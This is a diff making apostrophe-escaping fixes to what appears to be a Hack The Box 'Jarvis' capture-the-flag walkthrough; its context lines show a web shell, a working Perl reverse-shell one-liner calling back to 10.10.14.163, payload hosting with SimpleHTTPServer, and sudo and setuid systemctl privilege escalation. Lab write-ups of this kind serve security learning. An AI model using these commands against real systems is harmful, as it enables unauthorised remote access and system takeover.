@@ -153,7 +153,7 @@ Running the script without argument creates `cmd.php` in `/images`.
 
 ## Low-Privilege Shell
 
-Having `cmd.php` is as good as getting a shell. Let\'s run a Perl one-liner reverse shell back to me, like so:
+Having `cmd.php` is as good as getting a shell. Let's run a Perl one-liner reverse shell back to me, like so:
 
 ```
 perl -e 'use Socket;$i="10.10.14.163";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
@@ -167,7 +167,7 @@ Bam.
 
 ## Privilege Escalation
 
-During enumeration of `www-data`\'s account, I noted that `www-data` is able to `sudo` as `pepper` to run a Python script.
+During enumeration of `www-data`'s account, I noted that `www-data` is able to `sudo` as `pepper` to run a Python script.
 
 <a class="image-popup">
 ![e3c8db1e.png](/assets/images/posts/jarvis-htb-walkthrough/e3c8db1e.png)
@@ -193,13 +193,13 @@ Next, we host the reverse shell with Python's SimpleHTTPServer module.
 # python -m SimpleHTTPServer 80
 ```
 
-Finally, let\'s download the file.
+Finally, let's download the file.
 
 <a class="image-popup">
 ![324934ad.png](/assets/images/posts/jarvis-htb-walkthrough/324934ad.png)
 </a>
 
-We need to `chmod` the file to be executable as well. I\'ll leave that as an exercise. Once that\'s done, we can run the reverse shell over to us.
+We need to `chmod` the file to be executable as well. I'll leave that as an exercise. Once that's done, we can run the reverse shell over to us.
 
 <a class="image-popup">
 ![62b3a175.png](/assets/images/posts/jarvis-htb-walkthrough/62b3a175.png)
@@ -211,7 +211,7 @@ On our `nc` listener, a reverse shell appears...
 ![8ab63511.png](/assets/images/posts/jarvis-htb-walkthrough/8ab63511.png)
 </a>
 
-`user.txt` is at `pepper`\'s home directory.
+`user.txt` is at `pepper`'s home directory.
 
 <a class="image-popup">
 ![b37fb682.png](/assets/images/posts/jarvis-htb-walkthrough/b37fb682.png)
@@ -219,7 +219,7 @@ On our `nc` listener, a reverse shell appears...
 
 ### Getting `root.txt`
 
-During enumeration of `pepper`\'s account, I noted a `setuid` `systemctl` executable where the group `pepper` has the right to execute it.
+During enumeration of `pepper`'s account, I noted a `setuid` `systemctl` executable where the group `pepper` has the right to execute it.
 
 <a class="image-popup">
 ![9aafd008.png](/assets/images/posts/jarvis-htb-walkthrough/9aafd008.png)
